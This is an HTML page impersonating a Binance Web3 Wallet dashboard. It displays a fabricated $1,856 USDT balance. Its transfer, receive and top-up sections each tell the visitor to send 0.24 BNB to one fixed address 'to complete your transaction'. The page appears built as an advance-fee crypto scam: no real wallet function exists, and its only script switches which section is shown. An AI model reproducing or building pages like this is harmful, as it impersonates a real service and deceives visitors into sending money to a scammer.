<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
      <title>Binance Web3 Wallet Dashboard</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
          <style>
              body {
                    margin: 0;
                          font-family: 'Inter', sans-serif;
                                background-color: #0b0e11;
                                      color: #ffffff;
                                          }
                                              .container {
                                                    max-width: 420px;
                                                          margin: auto;
                                                                padding: 20px 16px;
                                                                    }
                                                                        .title {
                                                                              text-align: center;
                                                                                    font-size: 24px;
                                                                                          font-weight: 600;
                                                                                                margin-bottom: 10px;
                                                                                                    }
                                                                                                        .balance-box {
                                                                                                              background-color: #161a1e;
                                                                                                                    border-radius: 12px;
                                                                                                                          padding: 20px;
                                                                                                                                text-align: center;
                                                                                                                                    }
                                                                                                                                        .balance-amount {
                                                                                                                                              font-size: 32px;
                                                                                                                                                    font-weight: 700;
                                                                                                                                                        }
                                                                                                                                                            .actions {
                                                                                                                                                                  margin-top: 20px;
                                                                                                                                                                        display: flex;
                                                                                                                                                                              flex-wrap: wrap;
                                                                                                                                                                                    justify-content: space-between;
                                                                                                                                                                                          gap: 12px;
                                                                                                                                                                                              }
                                                                                                                                                                                                  .button {
                                                                                                                                                                                                        flex: 1 1 48%;
                                                                                                                                                                                                              background-color: #f0b90b;
                                                                                                                                                                                                                    border: none;
                                                                                                                                                                                                                          color: #000000;
                                                                                                                                                                                                                                font-weight: 600;
                                                                                                                                                                                                                                      border-radius: 12px;
                                                                                                                                                                                                                                            padding: 12px;
                                                                                                                                                                                                                                                  text-align: center;
                                                                                                                                                                                                                                                        text-decoration: none;
                                                                                                                                                                                                                                                              display: block;
                                                                                                                                                                                                                                                                  }
                                                                                                                                                                                                                                                                      .tokens-box {
                                                                                                                                                                                                                                                                            background-color: #161a1e;
                                                                                                                                                                                                                                                                                  border-radius: 12px;
                                                                                                                                                                                                                                                                                        padding: 16px;
                                                                                                                                                                                                                                                                                              margin-top: 24px;
                                                                                                                                                                                                                                                                                                  }
                                                                                                                                                                                                                                                                                                      .token-row {
                                                                                                                                                                                                                                                                                                            display: flex;
                                                                                                                                                                                                                                                                                                                  justify-content: space-between;
                                                                                                                                                                                                                                                                                                                        align-items: center;
                                                                                                                                                                                                                                                                                                                              padding: 10px 0;
                                                                                                                                                                                                                                                                                                                                    border-bottom: 1px solid #2a2e33;
                                                                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                                                                            .token-row:last-child {
                                                                                                                                                                                                                                                                                                                                                  border-bottom: none;
                                                                                                                                                                                                                                                                                                                                                      }
                                                                                                                                                                                                                                                                                                                                                          .token-info {
                                                                                                                                                                                                                                                                                                                                                                display: flex;
                                                                                                                                                                                                                                                                                                                                                                      align-items: center;
                                                                                                                                                                                                                                                                                                                                                                          }
                                                                                                                                                                                                                                                                                                                                                                              .token-info img {
                                                                                                                                                                                                                                                                                                                                                                                    width: 24px;
                                                                                                                                                                                                                                                                                                                                                                                          height: 24px;
                                                                                                                                                                                                                                                                                                                                                                                                margin-right: 10px;
                                                                                                                                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                                                                                                                                        .topup-link {
                                                                                                                                                                                                                                                                                                                                                                                                              display: block;
                                                                                                                                                                                                                                                                                                                                                                                                                    margin: 16px auto 0;
                                                                                                                                                                                                                                                                                                                                                                                                                          color: #f0b90b;
                                                                                                                                                                                                                                                                                                                                                                                                                                text-align: center;
                                                                                                                                                                                                                                                                                                                                                                                                                                      font-weight: 600;
                                                                                                                                                                                                                                                                                                                                                                                                                                            text-decoration: none;
                                                                                                                                                                                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                                                                                                                                                                                                    .section {
                                                                                                                                                                                                                                                                                                                                                                                                                                                          display: none;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                background-color: #161a1e;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                      margin-top: 24px;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                            padding: 20px;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  border-radius: 12px;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      }
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          .section p {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                margin: 8px 0;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        .highlight {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              color: #f0b90b;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  }
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    </style>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    </head>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <body>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      <div class="container">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          <div class="title">Assets</div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <div class="balance-box">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <div class="balance-amount">$1,856</div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        </div>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <div class="actions">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  <a href="#transfer" class="button">Transfer to main wallet</a>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <a href="#receive" class="button">Receive</a>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <a href="#history" class="button">History</a>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <a href="#approval" class="button">Top up 0.24 BNB</a>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        </div>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <div class="tokens-box">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  <div class="token-row">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          <div class="token-info">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <img src="data:image/png;base64," alt="BNB">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <span>BNB</span>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      </div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <div>$0</div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    </div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          <div class="token-row">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  <div class="token-info">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <img src="data:image/png;base64," alt="USDT">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      <span>USDT</span>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              </div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      <div>$1,856</div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </div>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <a href="#topup" class="topup-link">Top up BNB</a>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <div id="transfer" class="section">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <div class="title">Transfer to Main Wallet</div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <p>Network: <span class="highlight">BNB Smart Chain BEP20</span></p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          <p>Address: <span class="highlight">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</span></p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <p>Top up 0.24 BNB to complete your transaction.</p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    </div>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <div id="receive" class="section">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <div class="title">Receive</div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <p>Network: <span class="highlight">BNB Smart Chain BEP20</span></p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          <p>Address: <span class="highlight">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</span></p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              </div>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  <div id="history" class="section">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <div class="title">History</div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <p>No transaction history available.</p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </div>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      <div id="approval" class="section">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <div class="title">Top Up</div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  <p>Top up 0.24 BNB to this address to complete your transaction.</p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <p>Network: <span class="highlight">BNB Smart Chain BEP20</span></p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <p>Address: <span class="highlight">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</span></p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </div>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      <div id="topup" class="section">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <div class="title">Top up BNB</div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  <p>Deposit to the following address:</p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <p>Network: <span class="highlight">BNB Smart Chain BEP20</span></p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <p>Address: <span class="highlight">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</span></p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    </div>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      <script>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          document.querySelectorAll('a[href^="#"]').forEach(link => {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                link.addEventListener('click', function (e) {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        e.preventDefault();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                document.querySelectorAll('.section').forEach(div => div.style.display = 'none');
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        const target = document.querySelector(this.getAttribute('href'));
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                if (target) target.style.display = 'block';
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      });
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          });
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </script>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </body>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </html>
